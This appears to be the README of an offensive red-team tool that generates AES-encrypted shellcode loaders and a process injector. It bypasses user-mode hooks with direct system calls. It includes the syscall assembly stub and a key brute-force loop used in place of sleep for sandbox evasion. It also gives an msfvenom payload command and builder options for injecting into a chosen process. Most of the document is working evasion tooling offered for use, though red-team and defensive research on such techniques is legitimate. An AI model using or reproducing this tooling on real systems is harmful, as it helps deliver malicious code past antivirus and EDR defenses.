# GENERIC SYSCALL
This code impliments the Sorting by System Call Address method described in a [blogpost.](https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/)<br>

quick disasm with https://defuse.ca/online-x86-assembler.htm#disassembly
```
ZwX:
   58                          pop     rax            ; return address
   41 5A                       pop     r10
   50                          push    rax            ; save in shadow space as _rcx
   51                          push    rcx            ; rax = ssn
   58                          pop     rax
   52                          push    rdx            ; rcx = arg1
   41 5A                       pop     r10
   41 50                       push    r8             ; rdx = arg2
   5A                          pop     rdx
   41 51                       push    r9             ; r8 = arg3
   41 58                       pop     r8             ; r9 = arg4
   4C 8B 4C 24 20              mov     r9, [rsp + 0x20]
   0F 05                       syscall
   FF 64 24 18                 jmp     qword[rsp]
```

Additionally shellcode is encrypted with AES-CBC encryption via the kokke TinyAES library.  
The IV and key are generated with the get_random_bytes function in the pycryptodome library.  
The shellcode payload is decrypted with a crude brute-force loop of the last two bytes of the key instead of using the sleep function.  
```c 
for (int i = 0x00; i<=0xff;i++) {
    key[14] = i;
    for (int j = 0x00; j <= 0xff;j++) {
        key[15] = j;
        AES_init_ctx_iv(&ctx, key, iv);
        AES_CBC_decrypt_buffer(&ctx, encrypted_instructions, ENCRYPTED_BIN_LEN);
``` 
There is a loader, which just runs the shellcode in the same process via function pointer, a loader that does the same thing but via sections, and a process injector.  

requirments:
```
gcc
python3
nasm
```

use  
`python3 -m venv env`  
`source env/bin/activate`  
`pip install pycryptodome`  
`msfvenom -p windows/x64/exec CMD='C:\Windows\System32\notepad.exe' EXITFUNC=process -f raw -o test.bin`  
`python build.py -inbin test.bin -execmethod runner`  


```
usage: builder.py [-h] [-inbin INBIN] [-execmethod {section_inject,section_runner,section_runner_dll,runner,runner_dll}] [--process PROCESS] [--cmdline CMDLINE] [--v V]

generate AES encrypted shellcode runners

optional arguments:
  -h, --help            show this help message and exit
  -inbin INBIN          .bin file
  -execmethod {section_inject,section_runner,section_runner_dll,runner,runner_dll}
  --process PROCESS     process to inject (only with 'section_inject')
  --cmdline CMDLINE     cmdline argument to show
  --v V                 print config
  ```  


### References & Reading
Generally:
hasherezade 
forrestorr
batsec  
https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams
https://github.com/simon-whitehead/assembly-fun/blob/master/windows-x64/README.md  